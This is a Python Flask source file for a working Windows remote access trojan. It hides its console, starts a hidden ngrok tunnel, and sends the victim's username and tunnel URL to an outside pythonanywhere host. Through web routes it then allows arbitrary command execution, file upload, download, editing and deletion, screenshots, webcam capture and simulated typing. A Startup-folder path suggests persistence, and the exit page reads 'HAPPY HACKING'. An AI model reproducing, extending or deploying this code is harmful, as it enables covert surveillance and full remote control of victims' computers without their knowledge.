from flask import Flask, render_template, request, make_response, render_template_string, send_file, send_from_directory, redirect, Response
from werkzeug.utils import secure_filename
import os
import base64
import requests
import subprocess 
import bs4
import shutil
import threading
import time
import ctypes
from  pyautogui import screenshot
import re
import pyautogui
import cv2

username = subprocess.run('whoami', capture_output = True).stdout.decode().split("\\")[1][:-2]

REMOTE_URL = 'http://OpenBlue.pythonanywhere.com/recv'
DIR = rf"C:\Users\{username}\tk"
STUP = rf"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

#--------------------------------------------NGROK--------------------------------------------------

def start_rok():
    CREATE_NO_WINDOW = 0x08000000
    # subprocess.call( rf'C:\Users\{username}\tk\ngrok.exe http 5000 --bind-tls false -region in -log=stdout > ngrok.txt &', shell=True, creationflags=CREATE_NO_WINDOW)
    cwd = os.getcwd()
    os.chdir(DIR)
    subprocess.call( rf'ngrok.exe http 80 --bind-tls false -region in -log=stdout > ngrok.txt &', shell=True, creationflags=CREATE_NO_WINDOW)
    time.sleep(5)
    found = re.findall('url=\S+', ''.join(open(rf'{DIR}\ngrok.txt', 'r').readlines()))[0]
    url = str(found[found.index('h'):])
    send = requests.post(REMOTE_URL, data={'recv': rf'{username}==>{url}<>P'})

thread1 = threading.Thread(target=start_rok)


#--------------------------------------------SERVER--------------------------------------------------

app = Flask(__name__)


with open(rf'{DIR}\templates\server.html', 'r') as html_file:
    soup = bs4.BeautifulSoup(html_file)

title = soup.find('title')
title.string = '-'
title.string.replace_with(username)

div = soup.find("div", {"id": "shellwindow"})


def execute(usr_command, wait_time=0):
    time.sleep(wait_time)
    CREATE_NO_WINDOW = 0x08000000
    proc = subprocess.Popen(usr_command, shell=True, creationflags=CREATE_NO_WINDOW, stdout=subprocess.PIPE)
    output = proc.stdout.read().decode()
    div_after_command(data=output, tagname='pre')


def div_before_command(command):
    new = soup.new_tag('p')
    new.string = f'{username}@⌨ Windows> {command}'
    div.append(new)


def div_after_command(data='', special=[], tagname='p'):
    if data != '':
        new = soup.new_tag(tagname)
        new.string = data
        new['style'] = 'color: rgb(54, 224, 190); white-space: pre-wrap;overflow-wrap:anywhere;'
        if 'colorcode' in special:
            if os.path.isdir(data):
                new['style'] = 'color: rgb(52, 131, 235);'
        div.append(new)
    new = soup.new_tag(tagname)

    if 'clear' in special:
        children = div.findChildren("p" , recursive=False)
        for child in children:
            child.decompose()
        children = div.findChildren("pre" , recursive=False)
        for child in children:
            child.decompose()

    if 'nopath' not in special:
        new.string = str(os.getcwd()) + '>'
        div.append(new)


@app.route('/')
def my_form():
    return render_template(html_file)


@app.route('/recv', methods=['POST', 'GET'])
def recv():
    if request.method == 'POST':
        url = request.form['recv']
        print(url)
    return url


@app.route('/download', methods=['POST'])
def download():
    filename = request.form['downloadfile']
    return send_file(rf'{os.getcwd()}\{filename}', as_attachment=True ,attachment_filename=filename)


@app.route('/upload', methods=['POST'])
def upload():
    try:
        # files = request.files.getlist('uploadfiles[]')
        for file in request.files.getlist('uploadfiles[]'):
            file.save(os.path.join(os.getcwd(), file.filename))
    except Exception as e:
        print(e)
        return 'OOPS'
    return 'uploaded'


@app.route('/screenshot', methods=['POST'])
def ss():
    def del_ss():
        time.sleep(1)
        os.remove('ss.png')
    screenshot('ss.png')
    with open('ss.png', 'rb') as f:
        delss = threading.Thread(target=del_ss)
        delss.start()
        # return send_file('ss.png', as_attachment=True ,attachment_filename='Screenshot.png')
        return send_file(f'{os.getcwd()}\\ss.png')


@app.route('/screencast', methods=['POST'])
def screencast():
    sc = False
    if request.form['startsc'] == 'start':
        sc = True
        while sc:
            
            time.sleep(10)
    elif request.form['stopsc'] == 'stop':
        sc = False
        time.sleep(2)
        os.remove('ss.png')
        return 'SCREENCAST STOPPED'


@app.route('/finishedit', methods=['POST', 'GET'])
def save_edit():
    content = request.form['finedit']
    filename = request.form['filename']
    with open(filename, 'w',newline='') as f:
        f.write(content)
    return "Saved successfuly"
    

@app.route('/edit', methods=['POST', 'GET'])
def edit_file():
    if request.method == 'POST':
        filename__ = request.form['editfile']
        with open(filename__, 'r') as f:
            file_contents = ''.join(f.readlines())
        return render_template_string(f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body {{
            width: 100vw;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }}
        textarea {{
            width: 70vw;
            height: 75vh;
        }}
    </style>
</head>
<body>
    <form action="/finishedit" method="post" class="update" target="_blank">
        <input hidden type="text" name="filename" id="" value="{filename__}">
        <textarea id='ta' name="finedit">{file_contents}</textarea>
        <input type="submit" value="SAVE">
    </form>
</body>
</html>''')

@app.route('/camera', methods=['POST', 'GET'])
def takepic():
    cam = cv2.VideoCapture(0)
    cv2.namedWindow("test")
    ret, frame = cam.read()
    img_name = "opencv.png"
    cv2.imwrite(img_name, frame)
    def del_ss1():
        time.sleep(1)
        os.remove('opencv.png')
    with open('opencv.png', 'rb') as f:
        delss = threading.Thread(target=del_ss1)
        delss.start()
        # return send_file('ss.png', as_attachment=True ,attachment_filename='Screenshot.png')
        return send_file(f'{os.getcwd()}\\opencv.png')


@app.route('/cmd', methods=['POST', 'GET'])
def cmd():
    if request.method == 'GET':
        return render_template('server.html')

    if request.method == 'POST':
        command = request.form['cmd']
        div_before_command(command=command)

        if command[:2].lower() == 'cd':
            path = command[3:]
            if path == '':
                os.chdir(f"C:\\{username}")
            else:
                os.chdir(path)
            div_after_command()
            return render_template_string(str(soup))
        
        elif command[:2].lower() == 'ls':
            path = command[2:]
            if len(path) > 0:
                if path[0] == ' ':
                    path[0] = ''
            if path == '':
                result = os.listdir(os.getcwd())
            else: 
                result = os.listdir(command)
            for item in result:
                div_after_command(data=item, special=['nopath', 'colorcode'])
            return render_template_string(str(soup))

        elif command[:2].lower() == 'rm':
            if command[3:][:2] == '-r':
                file_path = command[6:]
                shutil.rmtree(file_path)
            else:
                file_path = command[3:]
                os.remove(file_path)
            return render_template_string(str(soup))

        elif command[:5].lower() == 'mkdir':
            dir_name = command[6:]
            os.mkdir(dir_name)
            return render_template_string(str(soup))
        
        elif command[:4].lower() == 'mkfl':
            file_name = command[5:]
            with open(file_name, 'w') as new_file:
                pass
            return render_template_string(str(soup))

        elif command[:3].lower() == 'pwd':
            div_after_command(data=os.getcwd(), special=['nopath'])
            return render_template_string(str(soup))

        elif command.lower() == 'clear':
            div_after_command(special=['nopath', 'clear'])
            return render_template_string(str(soup))

        elif command[:3].lower() == 'cat':
            with open(f'{command[4:]}', 'r') as f:
                contents = ''.join(f.readlines())
            div_after_command(data=contents, tagname='pre')
            return render_template_string(str(soup))

        elif command[:3].lower() == 'zip':
            file_to_zip = command.split(" ")[1]
            zip_name = command.split(" ")[2]
            shutil.make_archive(zip_name, 'zip', file_to_zip)

        elif command[:4].lower() == 'exec':
            usr_command = command[5:]
            try:
                run_thread = threading.Thread(target=execute, args=(usr_command,))
                run_thread.start()
                return render_template_string(str(soup))
            except Exception as e:
                return str(e)
        
        elif command[:4] == 'type':
            pyautogui.typewrite(command[5:])

        elif command[:4].lower() == 'exit':
            extra = command[5:]
            if '-k' in extra:
                os.chdir(DIR)
                kill_thread = threading.Thread(target=execute, args=("echo.bat", 2))
                kill_thread.start()
            return render_template_string('''
            <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body {
            width: 100vw;
            height: 100vh;
            background-image: url("templates/1.png");
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        h1 {
            font-family: monospace;
            font-size: 72pt;
            color: white;
            text-shadow: 0px 0px 10px white;
            background-color: rgba(0, 0, 0, 0.7);
            padding: 10px 20px;
        }
    </style>
</head>
<body>
    <h1>HAPPY HACKING ;)</h1>
</body>
</html>
            ''')
        else:
            div_after_command(data=f"{command} is not recognised as a command")
            return render_template_string(str(soup))

    return render_template('server.html')

if __name__ == "__main__":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    thread1.start()

    app.run(host='0.0.0.0', port=80)